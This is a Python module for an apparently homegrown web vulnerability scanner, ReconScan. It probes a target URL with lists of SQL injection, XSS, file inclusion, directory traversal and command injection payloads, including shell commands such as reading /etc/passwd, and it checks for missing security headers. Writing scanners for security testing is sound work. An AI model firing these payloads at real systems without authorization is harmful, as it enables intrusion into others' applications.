"""
ReconScan Scan Command Module

Main scanning functionality for web application vulnerability detection.
Provides modular scanning capabilities for SQL injection, XSS, LFI, command injection, and more.
"""

import asyncio
import aiohttp
import time
import urllib.parse
from pathlib import Path
from typing import List, Dict, Any, Optional
import json

class ScanCommand:
    """
    Core vulnerability scanning command for ReconScan.
    
    Supports multiple scan types including SQL injection, XSS, LFI, command injection,
    and security header analysis with comprehensive reporting.
    """
    
    # Command metadata - self-documenting for help system
    description = "Perform web vulnerability scans on target URLs"
    usage = "scan <target_url> [options]"
    example = "scan https://example.com --modules sqli,xss --output report.txt"
    category = "Scanning"
    
    def __init__(self):
        """Initialize scanner with modules and configuration."""
        
        # Load configuration
        from scanner.config_loader import get_system_config
        self.system_config = get_system_config()
        self.config = self._load_scan_config()
        
        # Available scan modules
        self.available_modules = {
            'sqli': 'SQL Injection Detection',
            'xss': 'Cross-Site Scripting Detection', 
            'lfi': 'Local File Inclusion Detection',
            'cmdinjection': 'Command Injection Detection',
            'headers': 'Security Headers Analysis',
            'dirtraversal': 'Directory Traversal Detection'
        }
        
        # Default modules to run
        self.default_modules = ['sqli', 'xss', 'headers']
        
        # Scan results storage
        self.results = {
            'scan_info': {},
            'vulnerabilities': [],
            'summary': {}
        }
        
    def execute(self, args=None):
        """
        Execute vulnerability scan with specified parameters.
        
        Args:
            args (str, optional): Scan arguments (target URL and options)
            
        Returns:
            bool: True if scan completed successfully
        """
        try:
            if not args or not args.strip():
                self._show_usage()
                return False
            
            # Parse scan arguments
            scan_params = self._parse_args(args.strip())
            
            if not scan_params:
                return False
            
            # Validate target URL
            if not self._validate_target(scan_params['target']):
                print(f"Error: Invalid target URL '{scan_params['target']}'")
                return False
            
            print(f"Starting vulnerability scan on: {scan_params['target']}")
            print(f"Modules: {', '.join(scan_params['modules'])}")
            print("=" * 60)
            
            # Run the scan
            return asyncio.run(self._run_scan(scan_params))
            
        except KeyboardInterrupt:
            print("\nScan interrupted by user.")
            return False
        except Exception as e:
            print(f"Error executing scan: {str(e)}")
            return False
    
    def _parse_args(self, args):
        """
        Parse scan command arguments.
        
        Args:
            args (str): Command line arguments
            
        Returns:
            dict: Parsed scan parameters or None if invalid
        """
        parts = args.split()
        
        if not parts:
            print("Error: Target URL required")
            return None
        
        target = parts[0]
        
        # Parse options
        scan_params = {
            'target': target,
            'modules': self.default_modules.copy(),
            'output': None,
            'verbose': self.config.get('output', {}).get('verbose', True),
            'threads': self.config.get('scanning', {}).get('threads', 5),
            'timeout': self.config.get('network', {}).get('timeout', 10)
        }
        
        # Process additional arguments
        i = 1
        while i < len(parts):
            arg = parts[i]
            
            if arg == '--modules' and i + 1 < len(parts):
                modules = parts[i + 1].split(',')
                scan_params['modules'] = [m.strip() for m in modules if m.strip() in self.available_modules]
                i += 2
            elif arg == '--output' and i + 1 < len(parts):
                scan_params['output'] = parts[i + 1]
                i += 2
            elif arg == '--threads' and i + 1 < len(parts):
                try:
                    scan_params['threads'] = int(parts[i + 1])
                except ValueError:
                    print(f"Warning: Invalid thread count '{parts[i + 1]}', using default")
                i += 2
            elif arg == '--timeout' and i + 1 < len(parts):
                try:
                    scan_params['timeout'] = int(parts[i + 1])
                except ValueError:
                    print(f"Warning: Invalid timeout '{parts[i + 1]}', using default")
                i += 2
            elif arg == '--verbose':
                scan_params['verbose'] = True
                i += 1
            elif arg == '--quiet':
                scan_params['verbose'] = False
                i += 1
            else:
                print(f"Warning: Unknown argument '{arg}', ignoring")
                i += 1
        
        return scan_params
    
    def _validate_target(self, target):
        """
        Validate target URL format and accessibility.
        
        Args:
            target (str): Target URL to validate
            
        Returns:
            bool: True if target is valid
        """
        try:
            parsed = urllib.parse.urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except Exception:
            return False
    
    async def _run_scan(self, params):
        """
        Execute the actual vulnerability scan.
        
        Args:
            params (dict): Scan parameters
            
        Returns:
            bool: True if scan completed successfully
        """
        start_time = time.time()
        
        # Initialize scan results
        self.results = {
            'scan_info': {
                'target': params['target'],
                'start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'modules': params['modules'],
                'scanner_version': self.system_config.get_app_info()['version']
            },
            'vulnerabilities': [],
            'summary': {}
        }
        
        # Create HTTP session with configuration
        timeout = aiohttp.ClientTimeout(total=params['timeout'])
        connector = aiohttp.TCPConnector(
            limit=params['threads'],
            ssl=not self.config.get('network', {}).get('verify_ssl', False)
        )
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={'User-Agent': self.config.get('network', {}).get('user_agent', 'ReconScan/1.0')}
        ) as session:
            
            # Run each module
            for module in params['modules']:
                if params['verbose']:
                    print(f"\n[+] Running {self.available_modules[module]}...")
                
                try:
                    await self._run_module(session, module, params)
                except Exception as e:
                    print(f"[-] Error in {module} module: {str(e)}")
                    continue
        
        # Calculate scan duration
        duration = time.time() - start_time
        self.results['scan_info']['duration'] = f"{duration:.2f}s"
        
        # Generate summary
        self._generate_summary()
        
        # Display results
        self._display_results(params['verbose'])
        
        # Save results if output specified
        if params['output']:
            self._save_results(params['output'])
        
        return True
    
    async def _run_module(self, session, module, params):
        """
        Run a specific vulnerability scan module.
        
        Args:
            session: aiohttp session
            module (str): Module name to run
            params (dict): Scan parameters
        """
        target = params['target']
        
        if module == 'sqli':
            await self._scan_sql_injection(session, target, params['verbose'])
        elif module == 'xss':
            await self._scan_xss(session, target, params['verbose'])
        elif module == 'lfi':
            await self._scan_lfi(session, target, params['verbose'])
        elif module == 'cmdinjection':
            await self._scan_command_injection(session, target, params['verbose'])
        elif module == 'headers':
            await self._scan_security_headers(session, target, params['verbose'])
        elif module == 'dirtraversal':
            await self._scan_directory_traversal(session, target, params['verbose'])
    
    async def _scan_sql_injection(self, session, target, verbose=True):
        """Basic SQL injection detection."""
        if verbose:
            print("  → Testing SQL injection payloads...")
        
        # Basic SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' /*",
            "' OR 1=1--",
            "' UNION SELECT NULL--"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                # Test with URL parameter
                test_url = f"{target}?id={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Look for SQL error indicators
                    error_indicators = [
                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed',
                        'sqlite_master', 'SQL syntax', 'mysql_num_rows'
                    ]
                    
                    if any(indicator.lower() in content.lower() for indicator in error_indicators):
                        vulnerability = {
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'description': 'SQL injection vulnerability detected through error-based testing'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"     SQL injection found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("     No SQL injection vulnerabilities detected")
    
    async def _scan_xss(self, session, target, verbose=True):
        """Basic XSS detection."""
        if verbose:
            print("   Testing XSS payloads...")
        
        # Basic XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                # Test with URL parameter
                test_url = f"{target}?q={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Check if payload is reflected in response
                    if payload in content or payload.replace("'", "&#x27;") in content:
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'Medium',
                            'url': test_url,
                            'payload': payload,
                            'description': 'XSS vulnerability detected through payload reflection'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"     XSS vulnerability found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("     No XSS vulnerabilities detected")
    
    async def _scan_lfi(self, session, target, verbose=True):
        """Basic Local File Inclusion detection."""
        if verbose:
            print("  → Testing LFI payloads...")
        
        # Basic LFI payloads
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/passwd%00",
            "..\\..\\..\\..\\boot.ini"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                # Test with file parameter
                test_url = f"{target}?file={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Look for file inclusion indicators
                    lfi_indicators = [
                        'root:x:0:0:', '[boot loader]', 'localhost',
                        '# This file contains', 'daemon:x:'
                    ]
                    
                    if any(indicator in content for indicator in lfi_indicators):
                        vulnerability = {
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'description': 'LFI vulnerability detected through file content disclosure'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"    ✗ LFI vulnerability found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("    ✓ No LFI vulnerabilities detected")
    
    async def _scan_command_injection(self, session, target, verbose=True):
        """Basic command injection detection."""
        if verbose:
            print("  → Testing command injection payloads...")
        
        # Basic command injection payloads
        payloads = [
            "; ls",
            "| whoami",
            "&& id",
            "; cat /etc/passwd",
            "| ping -c 1 127.0.0.1",
            "&& echo 'command_injection_test'"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                # Test with cmd parameter
                test_url = f"{target}?cmd={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Look for command execution indicators
                    cmd_indicators = [
                        'uid=', 'gid=', 'root:x:0:0:', 'PING',
                        'command_injection_test', 'total 0'
                    ]
                    
                    if any(indicator in content for indicator in cmd_indicators):
                        vulnerability = {
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'description': 'Command injection vulnerability detected through command execution'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"     Command injection found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("    ✓ No command injection vulnerabilities detected")
    
    async def _scan_security_headers(self, session, target, verbose=True):
        """Analyze security headers."""
        if verbose:
            print("  → Analyzing security headers...")
        
        try:
            async with session.get(target) as response:
                headers = response.headers
                
                # Check for important security headers
                security_headers = {
                    'X-Frame-Options': 'Clickjacking protection',
                    'X-XSS-Protection': 'XSS filtering',
                    'X-Content-Type-Options': 'MIME sniffing protection',
                    'Content-Security-Policy': 'Content Security Policy',
                    'Strict-Transport-Security': 'HTTPS enforcement',
                    'Referrer-Policy': 'Referrer information control',
                    'Feature-Policy': 'Feature access control'
                }
                
                missing_headers = []
                
                for header, description in security_headers.items():
                    if header not in headers:
                        missing_headers.append(header)
                        
                        vulnerability = {
                            'type': 'Missing Security Header',
                            'severity': 'Low',
                            'url': target,
                            'payload': f"Missing: {header}",
                            'description': f'Missing security header: {header} ({description})'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                
                if verbose:
                    if missing_headers:
                        print(f"     Missing security headers: {', '.join(missing_headers)}")
                    else:
                        print("     All important security headers present")
                        
        except Exception as e:
            if verbose:
                print(f"    ! Error analyzing headers: {str(e)}")
    
    async def _scan_directory_traversal(self, session, target, verbose=True):
        """Basic directory traversal detection."""
        if verbose:
            print("  → Testing directory traversal...")
        
        # Directory traversal payloads
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        vulnerabilities_found = 0
        
        for payload in payloads:
            try:
                test_url = f"{target}?path={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Look for directory traversal indicators
                    traversal_indicators = [
                        'root:x:0:0:', '[fonts]', 'for 16-bit app support'
                    ]
                    
                    if any(indicator in content for indicator in traversal_indicators):
                        vulnerability = {
                            'type': 'Directory Traversal',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'description': 'Directory traversal vulnerability detected'
                        }
                        self.results['vulnerabilities'].append(vulnerability)
                        vulnerabilities_found += 1
                        
                        if verbose:
                            print(f"    ✗ Directory traversal found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("    ✓ No directory traversal vulnerabilities detected")
    
    def _generate_summary(self):
        """Generate scan summary statistics."""
        vulnerabilities = self.results['vulnerabilities']
        
        # Count by severity
        severity_count = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        type_count = {}
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Unknown')
            vuln_type = vuln.get('type', 'Unknown')
            
            if severity in severity_count:
                severity_count[severity] += 1
            
            type_count[vuln_type] = type_count.get(vuln_type, 0) + 1
        
        self.results['summary'] = {
            'total_vulnerabilities': len(vulnerabilities),
            'by_severity': severity_count,
            'by_type': type_count
        }
    
    def _display_results(self, verbose=True):
        """Display scan results to console."""
        print("\n" + "=" * 60)
        print("SCAN RESULTS")
        print("=" * 60)
        
        summary = self.results['summary']
        print(f"Target: {self.results['scan_info']['target']}")
        print(f"Duration: {self.results['scan_info']['duration']}")
        print(f"Total vulnerabilities found: {summary['total_vulnerabilities']}")
        
        if summary['total_vulnerabilities'] > 0:
            print("\nBy Severity:")
            for severity, count in summary['by_severity'].items():
                if count > 0:
                    print(f"  {severity}: {count}")
            
            print("\nBy Type:")
            for vuln_type, count in summary['by_type'].items():
                print(f"  {vuln_type}: {count}")
            
            if verbose:
                print("\nDetailed Results:")
                for i, vuln in enumerate(self.results['vulnerabilities'], 1):
                    print(f"\n{i}. {vuln['type']} ({vuln['severity']})")
                    print(f"   URL: {vuln['url']}")
                    print(f"   Description: {vuln['description']}")
        else:
            print("\n✓ No vulnerabilities detected")
    
    def _save_results(self, output_file):
        """Save scan results to formatted text file using ReportCommand."""
        try:
            # Import ReportCommand to use its report generation
            from scanner.commands.report import ReportCommand
            
            # Use ReportCommand to generate and save the report
            output_path = ReportCommand.save_scan_results(self.results, output_file)
            
            print(f"\nResults saved to: {output_path}")
            
        except Exception as e:
            print(f"Error saving results: {str(e)}")
    
    def _load_scan_config(self):
        """Load scan configuration from file."""
        try:
            config_file = Path("config/scanner_config.json")
            if config_file.exists():
                with open(config_file, 'r') as f:
                    return json.load(f)
            else:
                # Return default configuration
                return {
                    "network": {
                        "timeout": 10,
                        "user_agent": "ReconScan/1.0",
                        "verify_ssl": False
                    },
                    "scanning": {
                        "threads": 5,
                        "delay": 0.5
                    },
                    "output": {
                        "verbose": True,
                        "report_format": "json"
                    }
                }
        except Exception:
            return {}
    
    def _show_usage(self):
        """Display usage information."""
        print("Usage: scan <target_url> [options]")
        print("\nOptions:")
        print("  --modules <list>    Comma-separated list of modules to run")
        print("                      Available: " + ", ".join(self.available_modules.keys()))
        print("  --output <file>     Save results to file (JSON format)")
        print("  --threads <num>     Number of concurrent threads (default: 5)")
        print("  --timeout <sec>     HTTP timeout in seconds (default: 10)")
        print("  --verbose           Enable verbose output (default)")
        print("  --quiet             Disable verbose output")
        print("\nExamples:")
        print("  scan https://example.com")
        print("  scan https://example.com --modules sqli,xss,headers")
        print("  scan https://example.com --output results.txt --threads 10")
        print("  scan https://example.com --modules lfi,cmdinjection --quiet")
